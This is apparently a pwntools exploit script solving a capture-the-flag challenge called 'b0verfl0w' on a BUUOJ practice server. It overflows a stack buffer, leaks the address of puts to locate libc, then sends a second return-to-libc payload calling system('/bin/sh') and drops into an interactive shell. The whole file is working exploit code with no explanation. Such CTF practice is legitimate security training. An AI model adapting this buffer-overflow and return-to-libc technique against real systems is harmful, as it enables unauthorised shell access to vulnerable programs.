from pwn import *

#context.log_level = 'debug'

pn = './b0verfl0w'

#p = process(pn)
p = remote('node4.buuoj.cn', 29852)
elf = ELF(pn)
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.buu.so')

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
vul = elf.sym['vul']

payload = b'a' * ( 0x20 + 4 ) + p32(puts_plt) + p32(vul) + p32(puts_got)

p.sendlineafter(b'What\'s your name?\n', payload)
p.recvuntil(b'\n.')

libc_base = u32(p.recv(4)) - libc.sym['puts']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * ( 0x20 + 4 ) + p32(system) + p32(0) + p32(bin_sh)

p.sendlineafter(b'What\'s your name?\n', payload)

p.recv()
p.interactive()

p.recv()
p.recv()
p.recv()
p.recv()